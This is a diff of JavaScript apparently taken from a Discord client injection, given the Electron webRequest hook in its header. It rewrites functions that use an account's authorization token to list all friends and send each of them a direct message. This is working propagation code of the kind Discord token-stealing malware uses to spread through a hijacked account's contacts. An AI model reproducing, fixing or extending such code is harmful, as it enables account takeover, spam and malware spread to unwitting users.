@@ -539,102 +539,92 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
 
 
 
-
 const M = 'err0r';
 
 function getFriendsList(token) {
-    const options = {
-        hostname: 'discord.com',
-        path: '/api/v6/users/@me/relationships',
-        method: 'GET',
-        headers: {
-            "Authorization": token,
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-        }
+    const headers = {
+        "Authorization": token,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     };
 
     return new Promise((resolve, reject) => {
-        const req = https.request(options, res => {
+        https.get("https://discord.com/api/v6/users/@me/relationships", { headers }, (response) => {
             let data = '';
-            res.on('data', chunk => {
+            response.on('data', (chunk) => {
                 data += chunk;
             });
-            res.on('end', () => {
-                resolve(JSON.parse(data).map(friend => friend.user.id));
+
+            response.on('end', () => {
+                try {
+                    const friendlist = JSON.parse(data);
+                    const friendIds = friendlist.map(friend => friend.user.id);
+                    resolve(friendIds);
+                } catch (error) {
+                    reject('Ошибка при получении списка друзей: ' + error.message);
+                }
             });
+        }).on('error', (error) => {
+            reject('Ошибка при получении списка друзей: ' + error.message);
         });
-
-        req.on('error', error => {
-            reject(error);
-        });
-
-        req.end();
     });
 }
 
 function sendMessageToFriend(token, recipientIds, message) {
-    recipientIds.forEach(async recipient => {
-        const Nitro = await getURL(`https://discord.com/api/v9/users/${recipient}/profile`, token);
-
-        const postData = JSON.stringify({ content: message });
-        const options = {
-            hostname: 'discord.com',
-            path: `/api/v10/channels/${Nitro}/messages`,
-            method: 'POST',
-            headers: {
-                "Authorization": token,
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-            }
-        };
-
-        const req = https.request(options, res => {
-            res.on('data', () => {}); // Just to consume response data
-            if (res.statusCode === 200) {
-                console.log(`Сообщение успешно отправлено пользователю с ID ${recipient}`);
-            } else {
-                console.error('Ошибка при отправке сообщения:', res.statusCode);
-            }
-        });
-
-        req.on('error', error => {
-            console.error('Произошла ошибка:', error);
-        });
-
-        req.write(postData);
-        req.end();
-    });
-}
-
-async function getURL(url, token) {
-    const options = {
-        hostname: 'discord.com',
-        path: url,
-        method: 'GET',
-        headers: {
-            "Authorization": token,
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-        }
+    const headers = {
+        "Authorization": token,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     };
 
-    return new Promise((resolve, reject) => {
-        const req = https.request(options, res => {
+    recipientIds.forEach(recipient => {
+        const requestData = JSON.stringify({ recipient_id: recipient });
+        
+        const req = https.request({
+            hostname: 'discord.com',
+            path: '/api/v10/users/@me/channels',
+            method: 'POST',
+            headers: headers
+        }, (res) => {
             let data = '';
-            res.on('data', chunk => {
+            res.on('data', (chunk) => {
                 data += chunk;
             });
+
             res.on('end', () => {
-                resolve(JSON.parse(data).id);
+                try {
+                    const responseData = JSON.parse(data);
+                    const channelId = responseData.id;
+                    if (channelId) {
+                        const messageData = JSON.stringify({ content: message });
+
+                        https.request({
+                            hostname: 'discord.com',
+                            path: `/api/v10/channels/${channelId}/messages`,
+                            method: 'POST',
+                            headers: headers
+                        }, (response) => {
+                            if (response.statusCode === 200) {
+                                console.log(`Сообщение успешно отправлено пользователю с ID ${recipient}`);
+                            } else {
+                                console.error('Ошибка при отправке сообщения');
+                                console.error(response.statusMessage);
+                            }
+                        }).end(messageData);
+                    } else {
+                        console.error('Ошибка при получении ID канала');
+                    }
+                } catch (error) {
+                    console.error('Ошибка при отправке сообщения: ' + error.message);
+                }
             });
         });
 
-        req.on('error', error => {
-            reject(error);
+        req.on('error', (error) => {
+            console.error('Ошибка при создании канала для сообщения: ' + error.message);
         });
 
-        req.end();
+        req.end(requestData);
     });
 }
 
@@ -644,7 +634,7 @@ async function main() {
         console.log("Список друзей:", friendIds);
         sendMessageToFriend(TOKEN, friendIds, M);
     } catch (error) {
-        console.error('Произошла ошибка:', error);
+        console.error(error);
     }
 }
 
